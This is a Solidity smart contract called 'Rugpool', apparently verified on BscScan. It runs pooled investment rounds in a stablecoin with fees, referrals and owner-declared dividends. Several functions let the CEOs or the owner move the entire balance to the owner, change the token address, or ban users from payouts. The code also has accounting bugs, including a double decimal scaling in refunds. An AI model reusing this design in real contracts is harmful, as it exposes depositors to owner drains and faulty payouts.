/**
 *Submitted for verification at BscScan.com on 2023-03-05
*/

// SPDX-License-Identifier: MIT License
pragma solidity 0.8.9;

/// @title Rugpool
/// @author Andre Costa @ terratecc.com



interface IERC20 {    
	function totalSupply() external view returns (uint256);
	function decimals() external view returns (uint8);
	function symbol() external view returns (string memory);
	function name() external view returns (string memory);
	function getOwner() external view returns (address);
	function balanceOf(address account) external view returns (uint256);
	function transfer(address recipient, uint256 amount) external returns (bool);
	function allowance(address _owner, address spender) external view returns (uint256);
	function approve(address spender, uint256 amount) external returns (bool);
	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
    
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }
    
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }
    
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }
    
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            
            if (returndata.length > 0) {
                

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

library SafeERC20 {
    using Address for address;

    function safeTransfer(
        IERC20 token,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }
    
    function safeApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender) + value;
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
            uint256 newAllowance = oldAllowance - value;
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
        }
    }
    
    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
    * @dev Initializes the contract setting the deployer as the initial owner.
    */
    constructor () {
      address msgSender = _msgSender();
      _owner = msgSender;
      emit OwnershipTransferred(address(0), msgSender);
    }

    /**
    * @dev Returns the address of the current owner.
    */
    function owner() public view returns (address) {
      return _owner;
    }
    
    modifier onlyOwner() {
      require(_owner == _msgSender(), "Ownable: caller is not the owner");
      _;
    }

    function renounceOwnership() public onlyOwner {
      emit OwnershipTransferred(_owner, address(0));
      _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
      _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
      require(newOwner != address(0), "Ownable: new owner is the zero address");
      emit OwnershipTransferred(_owner, newOwner);
      _owner = newOwner;
    }
}

contract Rugpool is Context, Ownable {
	using SafeERC20 for IERC20;

    IERC20 public USD;

    event Deposit(address indexed addr, uint256 amount);
    event Refund(address indexed addr, uint256 amount);
    event DividendPayout(address indexed addr, uint256 amount);
    event ReferralPayout(address indexed addr, uint256 amount);
		
	address payable public ceo1;
    address payable public ceo2;
    address payable public dev;

    mapping(address => bool) public ceoWithdraw;
    
    uint256 public devFee = 1;    
	uint256 public refFee = 0;

    uint256 public totalInvested;
    uint256 public totalReinvested;
    uint256 public totalDividendsEarned;
    uint256 public totalRefEarned;
    uint256 public totalRefunded;

    uint256 public minDeposit;

    enum RoundState {
        OPEN,
        FUNDED,
        CLAIM
    }

    struct Depo {
        uint256 amount;
        bool dividendWithdrawnOrReinvested;
        bool refunded;
        uint256 fees;
    }

    struct Player {
        uint256 totalInvested;
        uint256 totalDividendsEarned;
        uint256 totalRefEarned;
		uint256 totalRefunded;
    }

    struct InvestmentRound {
        uint256 maxInvestment;
        uint256 totalInvested;
        uint256 totalDividendsEarned;
        uint256 totalRefEarned;
        uint256 totalRefunded;

        uint256 claimStart;
        uint256 hoursToClaim;
        uint256 dividendPercentage;

        RoundState roundState;
        bool paused;
    }
    uint256 public lastInvestmentRoundId;

    mapping(uint256 => mapping(address => Depo)) public deposits;
    mapping(address => Player) public players;
    mapping(uint256 => InvestmentRound) public investmentRounds;

    mapping(address => bool) public banned;

    constructor() {         
		dev = payable(0x318cBF186eB13C74533943b054959867eE44eFFE);		
	    ceo1 = payable(0xd06C18610B6932e63B6330d211bAC9E61E4b2040);
        ceo2 = payable(0xfaCF6258D6da1b14d24541AaabC2843c60e6Ed7A);			

		USD = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);       

        minDeposit = 500;

        investmentRounds[lastInvestmentRoundId].roundState = RoundState.CLAIM;
    }   

    receive() external payable {
        (bool sent, ) = payable(owner()).call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }

    /// MODIFIERS

    modifier notBanned(address addr) {
        require(!banned[addr], "Address is Banned");
        _;
    }

    /// ADMIN

    function startInvestmentRound(uint256 maxInvestment, uint256 hoursToClaim) external onlyOwner {
        require(investmentRounds[lastInvestmentRoundId].roundState == RoundState.CLAIM, "Previous Investment Round hasn't finished");
        require(investmentRounds[lastInvestmentRoundId + 1].totalInvested <= maxInvestment * 10 ** USD.decimals(), "Predeposit exceeds Max Investment");
        require(investmentRounds[lastInvestmentRoundId].claimStart + (investmentRounds[lastInvestmentRoundId].hoursToClaim * 3600) < block.timestamp, "Claim Period has not finalized");

        lastInvestmentRoundId++;
        investmentRounds[lastInvestmentRoundId].maxInvestment = maxInvestment * 10 ** USD.decimals();
        investmentRounds[lastInvestmentRoundId].hoursToClaim = hoursToClaim;
    }

    function getTradingFund() external {
        require(msg.sender == ceo1 || msg.sender == ceo2, "Not a CEO!");
	    require(investmentRounds[lastInvestmentRoundId].roundState == RoundState.OPEN, "Incorrect Round State!");

        ceoWithdraw[msg.sender] = true;

        if (ceoWithdraw[ceo1] && ceoWithdraw[ceo2]) {

            ceoWithdraw[ceo1] = false;
            ceoWithdraw[ceo2] = false;
            investmentRounds[lastInvestmentRoundId].roundState = RoundState.FUNDED;

            if (USD.balanceOf(address(this)) > 0) {
                USD.transfer(owner(), USD.balanceOf(address(this)));
            }
        }
        
    }
    
    function openClaim(uint256 totalDividends) external onlyOwner {
        require(investmentRounds[lastInvestmentRoundId].roundState == RoundState.FUNDED, "Incorrect Round State!");
        investmentRounds[lastInvestmentRoundId].claimStart = block.timestamp;
        totalDividends = totalDividends * 10 ** USD.decimals();
        investmentRounds[lastInvestmentRoundId].dividendPercentage = (totalDividends * 1000) / investmentRounds[lastInvestmentRoundId].totalInvested;

        investmentRounds[lastInvestmentRoundId].roundState = RoundState.CLAIM;

        USD.transferFrom(msg.sender, address(this), totalDividends);

    }

    function setPauseInvestmentRound(bool status) external onlyOwner {
        investmentRounds[lastInvestmentRoundId].paused = status;
    }

    function emergencyWithdraw() external {
        require(msg.sender == ceo1 || msg.sender == ceo2, "Not a CEO!");

        ceoWithdraw[msg.sender] = true;

        if (ceoWithdraw[ceo1] && ceoWithdraw[ceo2]) {

            ceoWithdraw[ceo1] = false;
            ceoWithdraw[ceo2] = false;

            investmentRounds[lastInvestmentRoundId].paused = true;

            if (USD.balanceOf(address(this)) > 0) {
                USD.transfer(owner(), USD.balanceOf(address(this)));
            }
        }
        
    }
    

    /// INVEST
   
    function deposit(address upline, uint256 amount) external notBanned(msg.sender) {
        require(amount >= minDeposit, "Investment must be above Minimum Deposit");
        require(investmentRounds[lastInvestmentRoundId].roundState == RoundState.OPEN, "Investment Round is not Open");
        require(investmentRounds[lastInvestmentRoundId].totalInvested + amount <= investmentRounds[lastInvestmentRoundId].maxInvestment, "Exceeds Max Investment");

        amount = amount * 10 ** USD.decimals();
        
        deposits[lastInvestmentRoundId][msg.sender].amount += amount;
        players[msg.sender].totalInvested += amount;
        investmentRounds[lastInvestmentRoundId].totalInvested += amount;    
        
        USD.transferFrom(msg.sender, address(this), amount);
        uint256 fees = (amount * devFee) / 100;
		USD.transfer(dev, fees);
        
        emit Deposit(msg.sender, amount);

        fees += referralPayout(upline, amount, lastInvestmentRoundId);
        deposits[lastInvestmentRoundId][msg.sender].fees = fees;
    }

    function predeposit(address upline, uint256 amount) external notBanned(msg.sender) {
        require(amount >= minDeposit, "Investment must be above Minimum Deposit");
        require(investmentRounds[lastInvestmentRoundId].totalInvested + amount <= investmentRounds[lastInvestmentRoundId].maxInvestment, "Max Investment Amount Reached");
        require(investmentRounds[lastInvestmentRoundId].roundState != RoundState.OPEN, "Current Investment Round is Open");

        amount = amount * 10 ** USD.decimals();

        deposits[lastInvestmentRoundId + 1][msg.sender].amount += amount;
        players[msg.sender].totalInvested += amount;
        investmentRounds[lastInvestmentRoundId + 1].totalInvested += amount;
        
        USD.transferFrom(msg.sender, address(this), amount);
		uint256 fees = (amount * devFee) / 100;
		USD.transfer(dev, fees);

        emit Deposit(msg.sender, amount);

        fees += referralPayout(upline, amount, lastInvestmentRoundId + 1);
        deposits[lastInvestmentRoundId + 1][msg.sender].fees = fees;
    }

    function reinvest(address upline) external notBanned(msg.sender) {
        require(deposits[lastInvestmentRoundId][msg.sender].amount > 0, "No amount to Reinvest");
        require(!deposits[lastInvestmentRoundId][msg.sender].dividendWithdrawnOrReinvested, "Dividends already Withdrawn or Reinvested");
        require(investmentRounds[lastInvestmentRoundId].roundState == RoundState.CLAIM, "Claim is not Open");
        require(investmentRounds[lastInvestmentRoundId].claimStart + (investmentRounds[lastInvestmentRoundId].hoursToClaim * 3600) >= block.timestamp, "Claim Period has finalized");

        uint256 amount = (deposits[lastInvestmentRoundId][msg.sender].amount * investmentRounds[lastInvestmentRoundId].dividendPercentage) / 1000;

        deposits[lastInvestmentRoundId + 1][msg.sender].amount += amount;
        deposits[lastInvestmentRoundId][msg.sender].dividendWithdrawnOrReinvested = true;
        players[msg.sender].totalInvested += amount;
        investmentRounds[lastInvestmentRoundId + 1].totalInvested += amount;
        
		uint256 fees = (amount * devFee) / 100;
		USD.transfer(dev, fees);

        emit Deposit(msg.sender, amount);

        fees += referralPayout(upline, amount, lastInvestmentRoundId + 1);
        deposits[lastInvestmentRoundId + 1][msg.sender].fees = fees;
    }
	
    function payout() external notBanned(msg.sender) {      
        require(deposits[lastInvestmentRoundId][msg.sender].amount > 0, "No Earnings");
        require(!deposits[lastInvestmentRoundId][msg.sender].dividendWithdrawnOrReinvested, "Dividends already Withdrawn or Reinvested");
        require(investmentRounds[lastInvestmentRoundId].roundState == RoundState.CLAIM, "Claim is not Open");
        require(investmentRounds[lastInvestmentRoundId].claimStart + (investmentRounds[lastInvestmentRoundId].hoursToClaim * 3600) >= block.timestamp, "Claim Period has finalized");

        uint256 amount = calculatePayout(msg.sender);

        deposits[lastInvestmentRoundId][msg.sender].dividendWithdrawnOrReinvested = true;
        if (investmentRounds[lastInvestmentRoundId].dividendPercentage >= 1000) {
            players[msg.sender].totalDividendsEarned += (amount - deposits[lastInvestmentRoundId][msg.sender].amount);
            investmentRounds[lastInvestmentRoundId].totalDividendsEarned += (amount - deposits[lastInvestmentRoundId][msg.sender].amount);  
        }

        USD.transfer(msg.sender, amount);

        emit DividendPayout(msg.sender, amount);
           
    }

    function calculatePayout (address player) public view returns(uint256) {
        return (deposits[lastInvestmentRoundId][player].amount * investmentRounds[lastInvestmentRoundId].dividendPercentage) / 1000;
    }
    
        
    function referralPayout(address addr, uint256 amount, uint256 investmentRoundId) internal returns(uint256) {
        if(!banned[addr]) {
			uint256 bonus = amount * refFee / 100;
		    
            investmentRounds[investmentRoundId].totalRefEarned += bonus;
            players[addr].totalRefEarned += bonus;

			USD.transfer(addr, bonus);

            emit ReferralPayout(addr, bonus);

            return bonus; 
		}
        return 0;
    }

    function refundWallet(address wallet, uint256 investmentRoundId) external onlyOwner {
        require(investmentRoundId <= lastInvestmentRoundId + 1, "Invalid Investment Round");
        require(deposits[investmentRoundId][wallet].amount > 0, "No Investment Made");
        require(!deposits[investmentRoundId][wallet].dividendWithdrawnOrReinvested, "Withdraw or Reinvestment already made");
        require(!deposits[investmentRoundId][wallet].refunded, "Refund already made");

		banned[wallet] = true;
        uint256 amount = deposits[investmentRoundId][wallet].amount - deposits[investmentRoundId][wallet].fees;

        deposits[investmentRoundId][wallet].refunded = true;
        players[wallet].totalRefunded += amount;
        investmentRounds[investmentRoundId].totalRefunded += amount;

        amount = amount * 10 ** USD.decimals();
	    
        USD.transfer(wallet, amount);

        emit Refund(wallet, amount);
    }

    /// SETTERS

    function setCeo1(address newval) external returns (bool success) {
        require(newval != address(0), "Invalid Address!");
        require(msg.sender == ceo1, "Not CEO1!");
        ceo1 = payable(newval);
        return true;
    }

    function setCeo2(address newval) external returns (bool success) {
        require(newval != address(0), "Invalid Address!");
        require(msg.sender == ceo2, "Not CEO2!");
        ceo2 = payable(newval);
        return true;
    }   
    
	function setWalletBan(address wallet, bool status) external onlyOwner returns (bool success) {
        banned[wallet] = status;
        return true;
    }	

    function setHoursToClaim(uint256 hoursToClaim) external onlyOwner returns (bool success) {
        investmentRounds[lastInvestmentRoundId].hoursToClaim = hoursToClaim;
        return true;
    }

    function setMinDeposit(uint256 newVal) external onlyOwner returns (bool success) {
        require(minDeposit > 0, "Must be > 0!");
        minDeposit = newVal;
        return true;
    }

    function setRefFee(uint256 newVal) external onlyOwner returns (bool success) {
        refFee = newVal;
        return true;
    }

    function setUSD(address newVal) external onlyOwner returns (bool success) {
        USD = IERC20(newVal);
        return true;
    }	


	

    /// READ

    function getContractBalance() public view returns (uint256) {
        return USD.balanceOf(address(this));
    }

    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }

}